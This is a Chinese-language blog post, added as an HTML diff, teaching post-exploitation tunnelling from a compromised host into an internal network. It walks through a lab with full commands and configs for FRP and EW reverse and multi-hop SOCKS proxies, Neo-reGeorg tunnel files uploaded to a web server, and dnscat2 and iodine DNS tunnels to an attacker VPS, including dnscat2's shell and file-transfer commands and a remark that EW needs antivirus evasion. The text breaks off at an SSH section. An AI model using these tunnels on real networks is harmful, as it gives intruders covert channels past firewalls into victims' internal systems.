@@ -1,0 +1,1490 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="内网渗透篇-隧道代理, 船到桥头自然直">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>内网渗透篇-隧道代理 | 船到桥头自然直</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">船到桥头自然直</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">船到桥头自然直</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">内网渗透篇-隧道代理</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-02-24
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>什么是隧道？</strong></p>
+<p>在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</p>
+<p>在后渗透过程中，往往会遇到许多不出网主机。那么如何让我们可以访问到这些不出网的主机，然后进行内网的攻击从而进一步扩大战果，就需要利用到隧道代理了。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>攻击机kali    192.168.80.131(出网网段)
+沦陷机器win10 192.168.80.130 | 192.168.88.140
+内网机器win8  192.168.88.130 | 192.168.146.130</code></pre>
+<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p>代理：中转站，把不出网的机器的流量通过中转站和攻击机进行交互。</p>
+<p>端口转发：A端口流量转到B端口，A为新开，B为本就存在，对应关系为一对一</p>
+<p>正向代理：主动连接，Client去连接Server的行为</p>
+<p>反向代理：被动连接，Server去连接Client的行为</p>
+<h2 id="常规代理转发隧道"><a href="#常规代理转发隧道" class="headerlink" title="常规代理转发隧道"></a>常规代理转发隧道</h2><p>​    -FRP隧道</p>
+<p>​    -EW隧道</p>
+<p>​    -SSH隧道</p>
+<p>​    -DNS隧道</p>
+<p>​    -ICMP隧道</p>
+<p>​    -HTTP/HTTPS隧道</p>
+<h2 id="代理转发隧道选择"><a href="#代理转发隧道选择" class="headerlink" title="代理转发隧道选择"></a>代理转发隧道选择</h2><p>主要基于两点：一：出网协议；二：出网端口；根据边界机器支持的出网协议和出网端口来选择到底使用什么代理转发隧道，例如果边界机器协议都支持，那么可以可以自由选择，如果边界机器只支持ICMP协议，那么只能选择ICMP协议做代理转发隧道。</p>
+<p>判断机器出网协议：</p>
+<pre><code>1.ICMP 
+ping www.baidu.com
+2.TCP  
+nc -n IP por
+3.HTTP 
+curl IP:port   
+4.DNS  
+Windwos:
+ nslookup www.baidu.com vps-ip
+ nslookup www.baidu.com     // 不指定服务器，则使用默认的DNS服务器
+Linux:
+ dig @vps-ip www.baidu.com
+ dig www.baidu.com          // 不指定服务器，则使用默认的DNS服务器</code></pre>
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 等协议。相比于EW更稳定，FRP分服务端和客户端，服务端放攻击者公网VPS，客户端放受害者边界机器，由于是反向代理，顾边界机器需能访问到攻击机。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<h4 id="单级代理"><a href="#单级代理" class="headerlink" title="单级代理"></a><strong>单级代理</strong></h4><p><strong>frp服务端的配置</strong></p>
+<pre><code>frps.ini
+[common]
+bind_port = 7000
+vhost_https_port = 8001        #当代理出来的是web服务时，在外网访问http://vps的IP:7001[实战中可以⽤⼀些通透性较好的端⼝]
+#dashboard_port状态以及代理统计信息展示,网址:7500可查看详情
+dashboard_port = 7500
+#dashboard_user访问用户dashboard_pwd访问密码
+dashboard_user = admin
+dashboard_pwd = admin</code></pre>
+<p>启动服务端</p>
+<pre><code>linux    nohup ./frps -c frps.ini
+windows  frps.exe -c frps.ini</code></pre>
+<p><img src="/images/234.png"></p>
+<p>访问<a href="http://127.0.0.1:7500查看frp是否成功运行">http://127.0.0.1:7500查看frp是否成功运行</a></p>
+<p><img src="/images/235.png"></p>
+<p>填入上面配置时设置了用户名和密码： dashboard_user = admin dashboard_pwd = admin，输入配置的密码就行了。</p>
+<p>如图正常运行</p>
+<p><img src="/images/236.png"></p>
+<p><strong>frp客户端配置</strong></p>
+<pre><code>frpc.ini
+[common]
+#frp服务端IP或域名 [实战中⼀般都会直接⽤域名]
+server_addr = VPS-IP
+#frp服务器端⼝
+server_port = 8001
+#启⽤加密 [通信内容加密传输，有效防⽌流量被拦截]
+use_encryption = true
+#启⽤压缩 [传输内容进⾏压缩，有效减⼩传输的⽹络流量，加快流量转发速度，但会额外消耗⼀些CPU资源]
+use_compression = true
+#内⽹穿透通常⽤socks5
+[socks5]
+type = tcp
+#连接VPS内⽹穿透的远程连接端⼝
+remote_port = 9066
+#使⽤插件socks5代理
+plugin = socks5
+#socks5连接⼝令 [根据实际情况进⾏配置]
+plugin_user = admin
+plugin_passwd = admin</code></pre>
+<p>启动客户端</p>
+<pre><code>linux   nohup ./frpc -c ./frpc.ini
+windows frpc.exe -c frpc.ini</code></pre>
+<p><img src="/images/237.png"></p>
+<p><strong>查看frp服务端是否有客户端连接成功</strong></p>
+<p>成功连接</p>
+<p><img src="/images/238.png"></p>
+<p><strong>利用代理攻击目标内网</strong></p>
+<p>浏览器配置代理</p>
+<p><img src="/images/239.png"></p>
+<p><strong>访问内网机器服务</strong></p>
+<p><img src="/images/240.png"></p>
+<h4 id="多级代理"><a href="#多级代理" class="headerlink" title="多级代理"></a><strong>多级代理</strong></h4><pre><code>概述：kali启动frps.exe与win10用户启动frpc.exe连接，完成一级代理。win10用户启动frps.exe与win8用户启动frpc.exe连接，完成二级代理。更多级类似，就不做阐述。</code></pre>
+<p><strong>kali服务端配置</strong></p>
+<pre><code>frps.ini
+[common]
+bind_port = 8001
+bind_addr = 0.0.0.0
+dashboard_port = 7500
+dashboard_user = admin
+dashboard_pwd = admin</code></pre>
+<p><strong>win10客户端配置</strong></p>
+<pre><code>[common]
+server_addr = 192.168.80.131
+server_port = 8001
+
+[plugin_socks]
+type = tcp
+local_ip = 192.168.88.140
+local_port = 1080
+remote_port = 9066
+plugin = socks5
+use_encryption = true
+use_compression = true
+plugin_user = admin
+plugin_passwd = admin123</code></pre>
+<p>测试一级连通性，按照上面单级代理那样。</p>
+<p><img src="/images/241.png"></p>
+<p>进行二级代理配置</p>
+<p><strong>win10服务端配置</strong></p>
+<pre><code>[common]
+bind_port = 8001
+bind_addr = 0.0.0.0</code></pre>
+<p><strong>win8客户端配置</strong></p>
+<pre><code>[common]
+server_addr = 192.168.88.140
+server_port = 8001
+
+[plugin_socks]
+type = tcp
+remote_port = 1080
+plugin = socks5
+use_encryption = true
+use_compression = true
+plugin_user = admin
+plugin_passwd = admin123</code></pre>
+<p>测试多级联通性，原来的代理设置不需要更改。</p>
+<p><img src="/images/242.png"></p>
+<p><strong>更多使用方法参考官方文档</strong></p>
+<p><a target="_blank" rel="noopener" href="https://gofrp.org/docs/examples/">https://gofrp.org/docs/examples/</a></p>
+<h3 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h3><p>老牌代理转发工具，支持端口转发和socks5代理，但因为年代久远和使用的广泛度，已被各种AV标记严重，所以利用该工具进行代理转发需要进行工具的免杀。</p>
+<p><strong>ew有六种模式，分别是：</strong></p>
+<ul>
+<li>ssocksd </li>
+<li>rcsocks </li>
+<li>rssocks </li>
+<li>lcx_slave </li>
+<li>lcx_listen </li>
+<li>lcx_tran </li>
+</ul>
+<p>ssocksd是用于普通网络环境下的正向连接。 </p>
+<p>rcsocks 和 rssocks 用于反向连接。</p>
+<p>lcx_slave 、lcx_listen 和 lcx_tran 用于复杂网络环境的多级连接。 </p>
+<p><strong>常用参数</strong> </p>
+<p>-l：指定要监听的本地端口 </p>
+<p>-d：指定要反弹到的机器 ip </p>
+<p>-e：指定要反弹到的机器端口 </p>
+<p>-f：指定要主动连接的机器 ip </p>
+<p>-g：指定要主动连接的机器端口 </p>
+<p>-t：指定超时时长,默认为 1000</p>
+<h4 id="单级代理-1"><a href="#单级代理-1" class="headerlink" title="单级代理"></a>单级代理</h4><h5 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h5><p><img src="/images/243.png"></p>
+<p><strong>在win10执行</strong></p>
+<pre><code>ew_for_Win.exe -s ssocksd -l 1080</code></pre>
+<p><strong>编辑kali /etc/proxychains4.conf</strong></p>
+<pre><code>socks5 192.168.80.130 1080</code></pre>
+<p><strong>nmap</strong></p>
+<pre><code>nmap -sT -Pn 192.168.88.130</code></pre>
+<h5 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h5><p><img src="/images/244.png"></p>
+<p><strong>先在kali执行</strong></p>
+<pre><code>./ew_for_linux64 -s rcsocks -l 1080 -e 10808 </code></pre>
+<p><strong>然后在win10执行</strong></p>
+<pre><code>ew_for_Win.exe -s rssocks -d 192.168.80.131 -e 10808</code></pre>
+<p><strong>编辑kali /etc/proxychains4.conf</strong></p>
+<pre><code>socks5 127.0.0.1 1080</code></pre>
+<p><strong>nmap</strong></p>
+<pre><code>nmap -sT -Pn 192.168.88.130</code></pre>
+<h4 id="多级代理-1"><a href="#多级代理-1" class="headerlink" title="多级代理"></a>多级代理</h4><h5 id="正向代理-1"><a href="#正向代理-1" class="headerlink" title="正向代理"></a>正向代理</h5><p><img src="/images/245.png"></p>
+<p><strong>先在win8(C)上启动socks5代理服务</strong></p>
+<pre><code>ew_for_Win.exe -s ssocksd -l 1080</code></pre>
+<p><strong>再在win10(B)上设置端口转发</strong></p>
+<p>ew_for_Win.exe -s lcx_tran -l 监听端口 -f 指定得内网地址 -g 内网某服务端口</p>
+<pre><code>ew_for_Win.exe -s lcx_tran -l 1080 -f 192.168.88.130 -g 1080</code></pre>
+<p><strong>编辑kali /etc/proxychains4.conf</strong></p>
+<pre><code>socks5 192.168.80.130 1080</code></pre>
+<p><strong>nmap</strong></p>
+<pre><code>nmap -sT -Pn 192.168.146.130</code></pre>
+<h5 id="反向代理-1"><a href="#反向代理-1" class="headerlink" title="反向代理"></a>反向代理</h5><p><img src="/images/246.png"></p>
+<p><strong>先在kali(A)执行</strong></p>
+<pre><code>./ew_for_linux64 -s rcsocks -l 1080 -e 10808 </code></pre>
+<p><strong>然后在win10(B)执行</strong></p>
+<pre><code>ew_for_Win.exe -s lcx_slave -d 192.168.80.131 -e 10808 -f 192.168.88.130 -g 10808</code></pre>
+<p><strong>最后在win8(C)执行</strong></p>
+<pre><code>ew_for_Win.exe -s ssocksd -l 10808</code></pre>
+<p><strong>编辑kali /etc/proxychains4.conf</strong></p>
+<pre><code>socks5 127.0.0.1 1080</code></pre>
+<p><strong>nmap</strong></p>
+<pre><code>nmap -sT -Pn 192.168.146.130</code></pre>
+<p><strong>更多级类似，最内层开启代理，其他层进行转发</strong></p>
+<h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><p>Neo-reGeorg是常见的HTTP正向隧道工具，是reGeorg工具的升级版。</p>
+<ul>
+<li>提高 tunnel 连接安全性</li>
+<li>提高可用性，避免特征检测</li>
+<li>提高传输内容保密性</li>
+<li>应对更多的网络环境场景</li>
+<li>稳定性好</li>
+<li>端口复用</li>
+</ul>
+<p>下载地址</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
+<h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><ul>
+<li><strong>Step 1.</strong> 设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器</li>
+</ul>
+<pre><code>$ python3 neoreg.py generate -k password
+
+    [+] Create neoreg server files:
+       =&gt; neoreg_servers/tunnel.jspx
+       =&gt; neoreg_servers/tunnel_compatibility.jspx
+       =&gt; neoreg_servers/tunnel.php
+       =&gt; neoreg_servers/tunnel.ashx
+       =&gt; neoreg_servers/tunnel.aspx
+       =&gt; neoreg_servers/tunnel.jsp
+       =&gt; neoreg_servers/tunnel_compatibility.jsp</code></pre>
+<ul>
+<li><strong>Step 2.</strong> 使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理</li>
+</ul>
+<pre><code>$ python3 neoreg.py -k password -u http://xx/tunnel.php
++------------------------------------------------------------------------+
+  Log Level set to [DEBUG]
+  Starting socks server [127.0.0.1:1080]
+  Tunnel at:
+    http://xx/tunnel.php
++------------------------------------------------------------------------+</code></pre>
+<p>然后就是常规的代理设置访问了。</p>
+<h2 id="常规隧道介绍"><a href="#常规隧道介绍" class="headerlink" title="常规隧道介绍"></a>常规隧道介绍</h2><h3 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h3><p><strong>什么是DNS隧道？</strong></p>
+<p>DNS隧道(DNS Tunneling)是将其他协议的内容封装在DNS协议中，然后以DNS请求和响应包完成传输数据(通信)的技术。当前网络世界中的DNS是一项必不可少的服务，所以防火墙和入侵检测设备处于可用性和用户友好的考虑大都不会过滤DNS流量，也为DNS成为隐蔽信道创造了条件，因此，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色。</p>
+<p><strong>DNS隧道的原理：</strong></p>
+<p>DNS隧道，是隧道技术中的一种。DNS隧道很难防范，因为平时的业务也好，使用也罢，难免会用到DNS协议进行解析，所以防火墙大多对DNS的流量是放行状态。这时候，如果我们在边界机器构造一个恶意的域名（*.test.cn），本地的DNS服务器无法给出回答时，就会以迭代查询的方式通过互联网定位到所查询域的权威DNS服务器。最后，这条DNS请求会落到我们提前搭建好的恶意DNS服务器上。</p>
+<p><strong>适用环境</strong></p>
+<p>当我们的http、socks、tcp这样的协议、正反向端口转发都失败的时候，可以尝试使用DNS隧道。</p>
+<p><strong>DNS隧道技术实现</strong>：</p>
+<p>建立DNS隧道之前首先要准备公网VPS和域名。</p>
+<p><strong>查看DNS协议是否可以通信</strong></p>
+<pre><code>Windwos : nslookup domain
+Linux   : dig domain</code></pre>
+<p><strong>部署域名解析</strong></p>
+<p>上腾讯云购买个便宜的域名和具有公网IP的VPS</p>
+<p>在域名DNS解析上添加以下两条记录</p>
+<p>A记录：用于描述域名到IP地址的映射关系</p>
+<p>NS记录：用于指定该域名由哪个DNS服务器来进行解析</p>
+<p><img src="/images/249.png"></p>
+<p>第一条A类记录，告诉域名系统，”dns.xxx.com”的IP地址是”139.xxx.xxx.xxx”</p>
+<p>第二条NS记录，告诉域名系统，”dns2tcp.xxx.com”的域名由”dns.xxx.com”进行解析。</p>
+<p>最后这条”dns2tcp.xxx.com”的DNS就会被”139.xxx.xxx.xxx”的主机(也就是我们的VPS)，给解析掉。</p>
+<h4 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h4><p><strong>Ubuntu安装dnscat2（服务端）</strong></p>
+<pre><code>apt-get install gem
+apt-get install  ruby-dev
+apt-get install libpq-dev
+apt-get install ruby-bundler
+
+apt-get install git
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server
+bundle init
+bundle install</code></pre>
+<p><strong>启动服务端</strong></p>
+<pre><code> ruby ./dnscat2.rb dns2tcp.hackby.site -e open -c 123456 --no-cache</code></pre>
+<p>-c : 定义了“pre-shared secret”，可以使用具有预共享密钥的身份验证机制来防止中间人攻击。否则，因为传输的数据并未加密，所以可能被监听网络流量的第三方还原。如果不定义此参数，dnscat2会生成一个随机字符串（将其复制下来，在启动客户端时需要使用它）</p>
+<p>-e : 规定安全级别。“open”表示服务端允许客户端不进行加密</p>
+<p>–no-cache : 禁止缓存。务必在运行服务器时添加该选项，因为powershell-dnscat2客户端与dnscat2服务器的Caching模式不兼容</p>
+<p><strong>启动客户端</strong></p>
+<pre><code>linux:
+git clone https://github.com/iagox86/dnscat2
+cd dnscat2/client/
+make
+
+windows:
+#测试是否能够通信dnscat2-v0.07-client-win64.exe --ping dns2tcp.hackby    
+#连接服务端，secret后为设置的密码
+dnscat2-v0.07-client-win64.exe --dns domain=dns2tcp.hackby.site --secret=123456   </code></pre>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a></p>
+<p>客户端返回如下，则建立连接成功</p>
+<p><img src="/images/247.png"></p>
+<p><strong>dnscat2常用命令</strong></p>
+<pre><code>sessions    查看会话
+session -i 1 进入1会话
+shell    打开另一个会话，进入交互模式
+help    查看帮助
+download    下载
+ping    
+suspend    返回上一层
+upload
+shutdown    切断但钱会话
+quit    退出dnscat2控制台
+kill    切断通道</code></pre>
+<p><img src="/images/248.png"></p>
+<h4 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h4><p>iodine可以通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。iodine是基于C语言开发的，分为<strong>服务端程序iodined</strong>和<strong>客户端程序iodine</strong>。kali中内置了iodine。</p>
+<p>iodine相对于dnscat2来说，速度和稳定性都是在dnscat2之上的。</p>
+<p><strong>安装iodine</strong></p>
+<pre><code>apt install iodine</code></pre>
+<p><strong>服务端运行</strong></p>
+<pre><code>iodined -f -c -P d1m0n 192.168.0.1 dns2tcp.xxx.com -DD</code></pre>
+<pre><code>-f：在前台运行
+-c：禁止检查所有传入请求的客户端IP地址。
+-P：客户端和服务端之间用于验证身份的密码。
+-D：指定调试级别，-DD指第二级。“D”的数量随级别增加。
+这里的192.168.0.1为自定义局域网虚拟IP地址，建议不要与现有网段冲突
+注意！填写的地址为NS记录</code></pre>
+<p><img src="/images/250.png"></p>
+<p>完成基本配置后，可以通过iodine检查页面（<a target="_blank" rel="noopener" href="https://code.kryo.se/iodine/check-it%EF%BC%89%E6%A3%80%E6%9F%A5%E9%85%8D%E7%BD%AE%E6%98%AF%E5%90%A6%E6%AD%A3%E7%A1%AE">https://code.kryo.se/iodine/check-it）检查配置是否正确</a></p>
+<p><img src="/images/251.png"></p>
+<p><strong>客户端运行</strong></p>
+<h5 id="目标为Linux"><a href="#目标为Linux" class="headerlink" title="目标为Linux"></a><strong>目标为Linux</strong></h5><pre><code>iodine -f -P d1m0n dns2tcp.xxx.com -M 200 </code></pre>
+<pre><code>-r：iodine有时会自动将DNS隧道切换为UDP隧道，该参数的作用是强制在任何情况下使用DNS隧道
+-M：指定上行主机的大小。
+-m：调节最大下行分片的大小。
+-f：在前台运行
+-T：指定DNS请求类型TYPE，可选项有NULL、PRIVATE、TXT、SRV、CNAME、MX、A。
+-O：指定数据编码规范。
+-P：客户端和服务端之间用于验证身份的密码。
+-L：指定是否开启懒惰模式，默认开启。
+-I：指定两个请求之间的时间间隔。</code></pre>
+<p><img src="/images/252.png"></p>
+<p>查看客户端网卡信息，发现多了一块dns0虚拟网卡</p>
+<p><img src="/images/253.png"></p>
+<p><strong>使用DNS隧道</strong></p>
+<p><strong>服务端新起一个终端，连接失陷主机</strong></p>
+<p><img src="/images/254.png"></p>
+<p>或者利用SSH协议进行内网穿透代理，SSH通常都用来登录远程主机，传输的内容全部经过加密处理，同样它内置了命令可以作为代理服务器使用。</p>
+<p><strong>失陷主机执行以下命令</strong></p>
